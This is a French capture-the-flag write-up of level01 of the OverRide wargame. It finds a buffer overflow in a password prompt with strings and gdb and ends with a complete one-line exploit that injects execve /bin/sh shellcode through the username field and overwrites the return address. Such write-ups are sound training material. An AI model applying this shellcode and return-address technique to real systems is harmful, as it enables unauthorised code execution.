```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: level02
verifying username....

nope, incorrect username...
```

Un `strings level01` révèle les chaînes intéressantes :
```
verifying username....
dat_wil
admin
********* ADMIN LOGIN PROMPT *********
Enter Username:
nope, incorrect username...
Enter Password:
nope, incorrect password...
```
On tente donc `dat_wil` comme nom d'utilisateur et `admin` comme mot de passe :

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```
## Analyse statique

Sous `gdb`, un `info functions` fait ressortir trois fonctions : `main`,
`verify_user_name` et `verify_user_pass`. On les désassemble et on les
traduit en C.

En lisant le code, on constate que le nom d'utilisateur et le mot de passe
sont bien corrects, mais que, quel que soit le mot de passe saisi, la
fonction retourne toujours « fail »:

```
    if (ret == 0)
        goto fail;
    if (ret == 0)
        return (0);
```

Peu importe : on se moque que le mot de passe soit bon ou non, ça ne nous
aide pas à valider le level02.

La vraie faille est ailleurs : le buffer `pass` est alloué sur **64 octets**,
mais `fgets(pass, 0x64, stdin)` autorise l'écriture de **100 octets** dans
`pass`. C'est un **débordement de tampon (buffer overflow) de 36 octets**.

## Exploitation

J'essaie donc de déborder via la ligne du mot de passe (100 octets) pour
écraser l'adresse de retour et détourner le flux d'exécution.

### Trouver l'offset de l'adresse de retour

```
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x75757575 in ?? ()
```

`0x75757575` correspond à `uuuu` : c'est donc à cet emplacement qu'il faut
placer le shellcode, ou l'adresse pointant vers le shellcode.

### Où placer le shellcode

Le buffer `pass` ne fait que 100 octets : ce n'est pas assez pour y loger le
shellcode. Deux options :

- placer le shellcode dans une **variable d'environnement**, ou
- l'injecter dans le 'username'.

Le champ username accepte **256 octets**, et `verify_user_name` ne vérifie
que les **7 premiers octets** (`dat_wil`). On peut donc placer le shellcode
dans le username, juste après `dat_wil`.

Le username se trouve à l'adresse `0x804a040` ; le shellcode commencera donc
juste après `dat_wil`, à l'adresse **`0x804a047`** (`0x804a040 + 7`).
​```

### Construction du payload

- **username** = `dat_wil` + shellcode (le shellcode démarre pile à `0x804a047`)
- **password** = 80 octets de padding + `\x47\xa0\x04\x08` (adresse `0x804a047`
  en little-endian)

Le password fait donc 80 + 4 = 84 octets, ce qui reste bien en dessous de la
limite de 100 octets lue par `fgets`.

(python -c "print('dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrsssstttt' + '\x47\xa0\x04\x08')"; cat) | ./level01